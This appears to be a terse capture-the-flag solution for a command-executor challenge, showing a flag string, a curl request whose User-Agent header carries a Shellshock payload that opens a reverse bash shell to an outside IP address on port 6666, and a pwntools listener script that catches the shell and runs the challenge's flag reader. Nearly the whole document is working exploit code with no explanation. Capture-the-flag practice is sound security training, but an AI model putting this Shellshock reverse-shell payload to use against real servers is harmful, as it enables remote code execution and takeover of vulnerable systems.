

# FLAG{W0w U sh0cked m3 by 5h3115h0ck}

url -i 'https://command-executor.eof-ctf.ais3.ntu.st/index.php?func=cmd&cmd=env' -H "User-Agent: () { l:;}; /bin/bash -c bash >&/dev/tcp/60.251.236.17/6666 0>&1 "

```python
#!/usr/bin/env python
from pwn import *

l = listen(port = 6666)
y = l.wait_for_connection()

y.sendline( 'cd /;./flag-reader /flag' )

rnd = y.recv( 16 )
print rnd

y.send( rnd )

y.interactive()
```